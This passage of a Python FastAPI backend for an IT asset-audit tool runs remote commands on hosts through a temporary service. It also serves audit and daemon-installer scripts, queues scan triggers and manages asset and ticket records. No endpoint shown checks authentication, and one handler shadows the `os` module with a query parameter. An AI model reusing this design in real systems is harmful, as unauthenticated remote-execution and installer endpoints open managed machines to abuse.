                        results[method] = stderr.decode('utf-8', errors='ignore') if stderr else f"Exit code {rc}"
                finally:
                    try:
                        client.remove_service()
                    except Exception:
                        pass
                    client.disconnect()
        except Exception as e:
            logger.error(f"Failed to send notification via {method} on {req.ip_address}: {e}")
            results[method] = str(e)
            
    raise HTTPException(status_code=500, detail={"message": "All attempted remote execution methods failed.", "errors": results})

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

@app.get("/api/get-audit-script")
def get_audit_script(request: Request, client_id: str, os: str = None):
    user_agent = request.headers.get("User-Agent", "").lower()

    # Determine OS: explicit param wins, then fallback to User-Agent sniffing
    if os:
        is_unix = os.lower() in ("mac", "linux", "unix", "darwin")
    else:
        is_unix = any(k in user_agent for k in ("mac", "darwin", "linux", "curl", "wget"))

    if is_unix:
        script_file = "audit.sh"
        media_type  = "text/x-sh"
    else:
        script_file = "audit.ps1"
        media_type  = "text/plain"

    script_path = os_module.path.join(BASE_DIR, "scripts", script_file)
    if not os_module.path.exists(script_path):
        raise HTTPException(status_code=404, detail=f"Script not found: {script_file}")

    with open(script_path, "r", encoding="utf-8") as f:
        script_content = f.read()

    server_url = f"{request.url.scheme}://{request.url.netloc}"
    script_content = script_content.replace("CLIENT_ID_PLACEHOLDER", client_id)
    script_content = script_content.replace("http://127.0.0.1:8000/upload-audit", f"{server_url}/upload-audit")

    return PlainTextResponse(script_content, media_type=media_type)

@app.get("/api/install-daemon")
def get_install_daemon(request: Request, target_os: str = Query(None, alias="os")):
    user_agent = request.headers.get("User-Agent", "").lower()
    if target_os:
        is_unix = target_os.lower() in ("mac", "linux", "unix", "darwin")
    else:
        is_unix = any(k in user_agent for k in ("mac", "darwin", "linux", "curl", "wget"))

    script_file = "install_service.sh" if is_unix else "install_service.ps1"
    media_type = "text/x-sh" if is_unix else "text/plain"

    script_path = os.path.join(BASE_DIR, "scripts", script_file)
    if not os.path.exists(script_path):
        raise HTTPException(status_code=404, detail=f"Installer script not found: {script_file}")

    with open(script_path, "r", encoding="utf-8") as f:
        script_content = f.read()

    server_url = f"{request.url.scheme}://{request.url.netloc}"
    script_content = script_content.replace("http://192.168.1.52:8000", server_url)

    return PlainTextResponse(script_content, media_type=media_type)

pending_scan_triggers = set()


@app.post("/api/trigger-scan/{device_id}")
def trigger_immediate_scan(device_id: str):
    logger.info(f"Manual force-scan requested for device: {device_id}")
    clean_id = device_id.strip().lower()
    pending_scan_triggers.add(clean_id)
    pending_scan_triggers.add("ALL")
    return {
        "status": "triggered",
        "device_id": device_id,
        "message": f"Scan signal initiated for {device_id}. Target agent will execute scan immediately."
    }


@app.get("/api/check-trigger")
def check_trigger(device_name: str = Query(...)):
    triggered = False
    if pending_scan_triggers:
        triggered = True
        pending_scan_triggers.clear()
        logger.info(f"Trigger delivered to checking daemon: {device_name}")
    return {"trigger": triggered}


# ==============================================================================
# 11. ASSET LIFECYCLE & TICKET MANAGEMENT APIs
# ==============================================================================

class LifecycleData(BaseModel):
    mac_address: str
    computer_name: str = ""
    owner: str = ""
    vendor: str = ""
    status: str = "Active"
    warranty_start: str = ""
    warranty_end: str = ""
    warranty_notes: str = ""
    warranty_provider: str = ""
    purchase_price: str = ""
    purchase_date: str = ""
    supplier: str = ""
    po_number: str = ""


@app.get("/api/lifecycle/{mac_address}")
def get_lifecycle(mac_address: str):
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT * FROM asset_lifecycle WHERE mac_address=?", (mac_address,)).fetchone()
    if row:
        return dict(row)
    return {}


@app.post("/api/lifecycle")
def save_lifecycle(data: LifecycleData):
    now = datetime.now().isoformat()
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            INSERT INTO asset_lifecycle
                (mac_address, computer_name, owner, vendor, status, warranty_start, warranty_end,
                 warranty_notes, warranty_provider, purchase_price, purchase_date, supplier, po_number, updated_at)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            ON CONFLICT(mac_address) DO UPDATE SET
                computer_name=excluded.computer_name, owner=excluded.owner, vendor=excluded.vendor,
                status=excluded.status, warranty_start=excluded.warranty_start, warranty_end=excluded.warranty_end,
                warranty_notes=excluded.warranty_notes, warranty_provider=excluded.warranty_provider,
                purchase_price=excluded.purchase_price, purchase_date=excluded.purchase_date,
                supplier=excluded.supplier, po_number=excluded.po_number, updated_at=excluded.updated_at
        ''', (data.mac_address, data.computer_name, data.owner, data.vendor, data.status,
              data.warranty_start, data.warranty_end, data.warranty_notes, data.warranty_provider,
              data.purchase_price, data.purchase_date, data.supplier, data.po_number, now))
        conn.commit()
    return {"status": "saved"}


class TicketData(BaseModel):
    mac_address: str
    computer_name: str = ""
    ticket_number: str = ""
    summary: str = ""
    status: str = "Open"
    assigned: str = ""
    priority: str = "Medium"
    mtbf: str = ""


@app.get("/api/tickets/{mac_address}")
def get_tickets(mac_address: str):
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT * FROM asset_tickets WHERE mac_address=? ORDER BY created_at DESC", (mac_address,)).fetchall()
    return [dict(r) for r in rows]


@app.post("/api/tickets")
def create_ticket(data: TicketData):
    now = datetime.now().isoformat()
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            INSERT INTO asset_tickets (mac_address, computer_name, ticket_number, summary, status, assigned, priority, mtbf, created_at, updated_at)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        ''', (data.mac_address, data.computer_name, data.ticket_number, data.summary,
              data.status, data.assigned, data.priority, data.mtbf, now, now))
        conn.commit()
    return {"status": "created"}


@app.put("/api/tickets/{ticket_id}")
def update_ticket(ticket_id: int, data: TicketData):
    now = datetime.now().isoformat()
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            UPDATE asset_tickets SET summary=?, status=?, assigned=?, priority=?, mtbf=?, updated_at=?
            WHERE id=?
        ''', (data.summary, data.status, data.assigned, data.priority, data.mtbf, now, ticket_id))
        conn.commit()
    return {"status": "updated"}


@app.delete("/api/tickets/{ticket_id}")
def delete_ticket(ticket_id: int):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("DELETE FROM asset_tickets WHERE id=?", (ticket_id,))
        conn.commit()
    return {"status": "deleted"}

# ==============================================================================
# 10. SERVE FRONTEND (UI)
# ==============================================================================
BASE_DIR     = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

SCRIPTS_DIR = os.path.join(BASE_DIR, "scripts")
if os.path.exists(SCRIPTS_DIR):
    app.mount("/scripts", StaticFiles(directory=SCRIPTS_DIR), name="scripts")

FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")

@app.get("/")
def read_root():
    index_path = os.path.join(FRONTEND_DIR, "index.html")
    if os.path.exists(index_path):
        return FileResponse(
            index_path,
            headers={
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
    return {"message": "Frontend index.html not found"}

if os.path.exists(FRONTEND_DIR):
    app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
